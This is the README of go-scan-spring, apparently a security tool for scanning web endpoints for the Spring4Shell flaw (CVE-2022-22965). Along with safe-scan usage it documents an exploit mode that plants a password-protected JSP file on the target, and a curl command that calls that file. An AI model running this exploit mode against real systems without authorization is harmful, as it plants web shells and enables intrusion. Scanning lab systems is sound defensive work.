<h1 align="center">
  <br>
    go-scan-spring
  <br>
  <br>
</h1>

<h4 align="center">Vulnerability scanner to find Spring4Shell (CVE-2022-22965) vulnerabilities</h4>
<p align="center">For more information: <a href="https://www.fracturelabs.com/posts/effective-spring4shell-scanning-exploitation/">https://www.fracturelabs.com/posts/effective-spring4shell-scanning-exploitation/</a></p>
<p align="center">
  <a href="https://twitter.com/fracturelabs"><img src="https://img.shields.io/badge/twitter-%40fracturelabs-orange.svg" alt="@fracturelabs" height="18"></a>
  <a href="https://twitter.com/brkr19"><img src="https://img.shields.io/badge/twitter-%40brkr19-orange.svg" alt="@brkr19" height="18"></a>
</p>
<br>

# Build
```bash
[~/opt] $ git clone https://github.com/fracturelabs/go-scan-spring.git
[~/opt] $ cd go-scan-spring
```

# Usage
## Help
```bash
[~/opt/go-scan-spring] $ go run main.go help scan

Run a scan against target URLs looking for vulnerable services

Usage:
  go-scan-spring scan [flags]

Flags:
  -f, --file string         Target URL filename (- for stdin)
      --follow-redirect     Follow redirects
  -h, --help                help for scan
      --http-get            Test using HTTP GET requests (must set =false to disable) (default true)
      --http-post           Test using HTTP POST requests (must set =false to disable) (default true)
      --identifier string   Unique scan identifier (used as a password and an exploit filename) (default "go-scan-spring")
  -x, --proxy string        Upstream proxy
      --run-baseline        Run a baseline test to see if endpoint is up
      --run-exploit         Run an exploit to retrieve the owner of the Tomcat process
      --run-safe            Run a safe test to see if endpoint is vulnerable
  -s, --sleep int           Time to sleep between exploit steps. This is needed to allow time for deployment. (default 10)
  -t, --threads int         Number of threads (default 5)

Global Flags:
      --debug   enable debug logging
```
## Basic safe scan
```bash
[~/opt/go-scan-spring] $ go run main.go scan --run-safe -f urls.txt
```

## Basic safe exploit
Use your own unique `identifier` parameter!

```bash
# Using HTTP GETs and POSTs
[~/opt/go-scan-spring] $ echo http://localhost:8080/spring4shell_victim/vulnerable | go run main.go scan -f - --identifier 550bafe0-0c6c-4f3e-a46b-0901c28e690b --run-exploit

# Using only HTTP GETs
[~/opt/go-scan-spring] $ echo http://localhost:8080/spring4shell_victim/vulnerable | go run main.go scan -f - --identifier 550bafe0-0c6c-4f3e-a46b-0901c28e690b --run-exploit --http-post=false

# Using only HTTP POSTs
[~/opt/go-scan-spring] $ echo http://localhost:8080/spring4shell_victim/vulnerable | go run main.go scan -f - --identifier 550bafe0-0c6c-4f3e-a46b-0901c28e690b --run-exploit --http-get=false
```

### Verification
You can verify the script works properly by testing against an intentionally vulnerable system, such as [spring4shell_victim](https://github.com/fracturelabs/spring4shell_victim)

```bash
[~] $ curl --output - 'http://localhost:8080/go-scan-spring/550bafe0-0c6c-4f3e-a46b-0901c28e690b-AD.jsp?pwd=550bafe0-0c6c-4f3e-a46b-0901c28e690b'
```


# Credits
* The entire structure and several functions were borrowed heavily from the wonderful [GoWitness](https://github.com/sensepost/gowitness) project from SensePost.
* The safe check implemented in this was inspired by [The Randori Attack Team](https://twitter.com/RandoriAttack/status/1509298490106593283) and [Zach Grace](https://twitter.com/ztgrace)
* Whoever created the first PoC - stuff is moving too fast to properly attribute this right now!
